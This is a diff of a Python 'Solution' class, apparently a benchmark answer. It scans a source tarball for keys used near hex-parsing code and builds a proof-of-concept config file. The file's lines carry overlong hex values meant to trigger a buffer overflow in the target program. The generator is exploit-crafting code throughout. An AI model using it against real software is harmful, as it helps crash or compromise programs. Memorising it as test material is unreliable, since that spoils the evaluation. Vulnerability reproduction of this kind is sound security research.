@@ -1,124 +1,166 @@
 import os
-import re
 import tarfile
+import re
 
 class Solution:
-    def _read_member_text(self, tar, member, max_bytes=1024 * 1024):
-        try:
-            f = tar.extractfile(member)
-            if not f:
-                return ""
-            data = f.read(max_bytes)
-            try:
-                return data.decode("utf-8", errors="ignore")
-            except Exception:
-                try:
-                    return data.decode("latin-1", errors="ignore")
-                except Exception:
-                    return ""
-        except Exception:
-            return ""
-
-    def _detect_hex_related_keys(self, src_path):
-        # Search source files for hex-related parsing and nearby key names
-        code_exts = {
-            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".go", ".rs",
-            ".m", ".mm"
-        }
-        likely_keys = set()
-        try:
-            with tarfile.open(src_path, "r:*") as tar:
-                members = [m for m in tar.getmembers() if m.isfile()]
-                for m in members:
-                    name = m.name.lower()
-                    _, ext = os.path.splitext(name)
-                    if ext in code_exts:
-                        text = self._read_member_text(tar, m)
-                        if not text:
-                            continue
-                        # Find hex-related code patterns
-                        for match in re.finditer(r'isxdigit\s*\(|strto[u]*l*l?\s*\([^,]+,[^,]*, *16\)|sscanf\s*\([^,]+,\s*"%\s*[xX]', text):
-                            start = max(0, match.start() - 2000)
-                            end = min(len(text), match.end() + 2000)
-                            window = text[start:end]
-
-                            # Extract candidate keys via string compares
-                            for km in re.finditer(r'(?:strcmp|strcasecmp|strncmp|strncasecmp)\s*\(\s*[^,]+,\s*"([^"\n]{1,64})"', window):
-                                s = km.group(1)
-                                if not s:
-                                    continue
-                                # Filter out obviously non-keys
-                                if any(tok in s.lower() for tok in ["%s", "%d", "%x", "usage", "error", "warning", "hex", "help"]):
-                                    continue
-                                # Keep likely config keys: shortish alnum, underscores, dashes
-                                if re.fullmatch(r"[A-Za-z][A-Za-z0-9_\-\.]{0,31}", s):
-                                    likely_keys.add(s)
-                            # Also directly add "color" if seen in nearby strings
-                            if re.search(r'"color"', window, re.IGNORECASE):
-                                likely_keys.add("color")
-                            if re.search(r'"foreground"|\"fg\"', window, re.IGNORECASE):
-                                likely_keys.add("foreground")
-                            if re.search(r'"background"|\"bg\"', window, re.IGNORECASE):
-                                likely_keys.add("background")
-                            if re.search(r'"address"|\"addr\"', window, re.IGNORECASE):
-                                likely_keys.add("address")
-                            if re.search(r'"mac"', window, re.IGNORECASE):
-                                likely_keys.add("mac")
-                            if re.search(r'"key"', window, re.IGNORECASE):
-                                likely_keys.add("key")
-                            if re.search(r'"token"', window, re.IGNORECASE):
-                                likely_keys.add("token")
-                            if re.search(r'"id"', window, re.IGNORECASE):
-                                likely_keys.add("id")
-                            if re.search(r'"guid"|\"uuid\"', window, re.IGNORECASE):
-                                likely_keys.add("uuid")
-                            if re.search(r'"salt"|\"secret\"', window, re.IGNORECASE):
-                                likely_keys.add("salt")
-        except Exception:
-            pass
-
-        # Rank keys by likelihood related to hex handling
-        priority = [
-            "color", "foreground", "background", "key", "token", "id",
-            "uuid", "guid", "address", "addr", "mac", "salt", "secret",
-            "hash", "mask", "serial"
-        ]
-        # Intersect with detected keys
-        ranked = [k for k in priority if k in likely_keys]
-
-        # If none detected, fallback to generic keys
-        if not ranked:
-            ranked = ["hex", "color", "key"]
-
-        # Limit to a few keys to keep PoC concise
-        return ranked[:3]
-
-    def _gen_hex(self, n):
-        base = "0123456789ABCDEF"
-        full = (base * ((n // len(base)) + 1))[:n]
-        return full
-
     def solve(self, src_path: str) -> bytes:
-        keys = self._detect_hex_related_keys(src_path)
+        def extract_candidate_keys_from_source(tar_path):
+            keys_score = {}
+            hex_markers = ('isxdigit', 'hex', 'fromhex', 'tohex', 'hexdigit', 'strtol', 'strtoul', '%x', '%X', 'sscanf', 'hexstring', 'hex_value', 'hexval')
+            string_re = re.compile(r'"([^"\n]{1,64})"')
+            strcmp_re = re.compile(r'str(?:case)?cmp\s*\(\s*([a-zA-Z_][\w]*)\s*,\s*"([^"\n]{1,64})"\s*\)')
+            # Acceptable key pattern
+            key_pat = re.compile(r'^[A-Za-z0-9_.\-]+$')
 
-        # Construct PoC with long hex values; include both 0x and # for color-like keys
-        # Keep each long value to 512 hex digits to be sizable but not enormous
-        hex_len = 512
+            try:
+                tf = tarfile.open(tar_path, 'r:*')
+            except Exception:
+                return []
+
+            for member in tf.getmembers():
+                if not member.isfile():
+                    continue
+                # Only consider small/medium text-like files
+                if member.size > 2_000_000:
+                    continue
+                name_lower = member.name.lower()
+                if not any(name_lower.endswith(ext) for ext in ('.c', '.h', '.hpp', '.hh', '.cc', '.cpp', '.cxx', '.l', '.y', '.py', '.rs', '.go', '.java', '.m', '.mm', '.txt', '.md', '.conf', '.ini', '.cfg', '.yaml', '.yml', '.toml')):
+                    continue
+                try:
+                    f = tf.extractfile(member)
+                    if not f:
+                        continue
+                    data = f.read()
+                except Exception:
+                    continue
+                if not data:
+                    continue
+                try:
+                    text = data.decode('utf-8', errors='ignore')
+                except Exception:
+                    continue
+                text_low = text.lower()
+
+                # Quick filter: only process files that mention a hex-related marker
+                if not any(marker in text_low for marker in hex_markers):
+                    continue
+
+                # Find positions of hex markers
+                hex_positions = []
+                for m in re.finditer(r'isxdigit|hex|fromhex|tohex|hexdigit|strtol|strtoul|%x|%X|sscanf|hexstring|hex_value|hexval', text_low):
+                    hex_positions.append(m.start())
+                if not hex_positions:
+                    continue
+
+                # Collect string literals and strcmp targets near hex markers
+                candidates = set()
+                for m in strcmp_re.finditer(text):
+                    candidates.add((m.start(), m.group(2)))
+                # Also any string literal (fallback)
+                for m in string_re.finditer(text):
+                    candidates.add((m.start(), m.group(1)))
+
+                # Score candidates by proximity to hex contexts
+                for pos, s in candidates:
+                    if len(s) < 2 or len(s) > 64:
+                        continue
+                    if not key_pat.match(s):
+                        continue
+                    # Filter out obviously non-keys
+                    s_low = s.lower()
+                    if s_low in {'true','false','yes','no','on','off','null','none','error','warning','debug','info','trace','usage'}:
+                        continue
+                    if s_low.startswith('http://') or s_low.startswith('https://'):
+                        continue
+                    # Compute proximity score
+                    nearest = min((abs(pos - hp) for hp in hex_positions), default=10**9)
+                    score = max(0.0, 1_000_000.0 / (1.0 + nearest))
+                    keys_score[s] = keys_score.get(s, 0.0) + score
+
+            tf.close()
+            # Return keys sorted by score
+            sorted_keys = sorted(keys_score.items(), key=lambda kv: kv[1], reverse=True)
+            # Filter to likely config keys based on common substrings
+            preferred = []
+            others = []
+            pref_subs = ('key', 'hex', 'color', 'hash', 'addr', 'address', 'token', 'secret', 'public', 'private', 'bg', 'fg', 'rgb', 'mac', 'seed', 'signature', 'blob', 'data', 'serial', 'uuid', 'guid', 'palette')
+            for k, _ in sorted_keys:
+                kl = k.lower()
+                if any(sub in kl for sub in pref_subs):
+                    preferred.append(k)
+                else:
+                    others.append(k)
+            result = preferred + others
+            # Unique preserve order
+            seen = set()
+            uniq = []
+            for k in result:
+                if k not in seen:
+                    seen.add(k)
+                    uniq.append(k)
+            return uniq[:10]
+
+        # Extract candidate keys
+        keys = extract_candidate_keys_from_source(src_path)
+        # Fallback keys if none found
+        if not keys:
+            keys = [
+                'hex',
+                'key',
+                'color',
+                'hash',
+                'address',
+                'public_key',
+                'private_key',
+                'bg',
+                'fg',
+                'rgb'
+            ]
+
+        # Choose a handful of keys to limit size
+        keys = keys[:5]
+
+        # Build PoC lines with long hex strings. Use length slightly over 512 (e.g., 530)
+        hex_len = 530  # even number to form full bytes if parser groups by pairs
+        # Create different hex sequences to avoid any deduplication or early cutoffs
+        seqs = [
+            'a' * hex_len,
+            'b' * hex_len,
+            'c' * hex_len,
+            'd' * hex_len,
+            'e' * hex_len,
+            'f' * hex_len,
+            ''.join('0123456789abcdef'[(i % 16)] for i in range(hex_len))
+        ]
 
         lines = []
-        # Add a simple recognizable header often accepted by many config parsers
-        lines.append("[config]")
+        # Mix of assignment styles
+        styles = [
+            '{k}=0x{v}',
+            '{k} = 0x{v}',
+            '{k}: 0x{v}',
+            '{k}\t0x{v}',
+            '{k}="0x{v}"',
+            '{k} = "0x{v}"'
+        ]
 
+        # Compose lines prioritizing likely keys
+        seq_idx = 0
         for k in keys:
-            val_hex = self._gen_hex(hex_len)
-            # Primary line: key=0x....
-            lines.append(f"{k}=0x{val_hex}")
-            # If key seems color-like, also add a '#' prefixed variant
-            if any(tag in k.lower() for tag in ("color", "foreground", "background", "fg", "bg")):
-                lines.append(f"{k}=#{val_hex}")
+            for s in styles[:2]:
+                v = seqs[seq_idx % len(seqs)]
+                lines.append(s.format(k=k, v=v))
+                seq_idx += 1
 
-        # Add a generic hex-only line as backup
-        lines.append(f"hex=0x{self._gen_hex(hex_len)}")
+        # Add a couple more variants to broaden chances
+        extra_keys = ['token', 'secret', 'signature']
+        for k in extra_keys:
+            v = seqs[seq_idx % len(seqs)]
+            lines.append(f'{k}=0x{v}')
+            seq_idx += 1
 
-        payload = ("\n".join(lines) + "\n").encode("ascii")
-        return payload
+        # Finally, include a raw hex-only line as a fallback
+        lines.append('0x' + ('1' * hex_len))
+
+        poc = '\n'.join(lines) + '\n'
+        return poc.encode('ascii', errors='ignore')
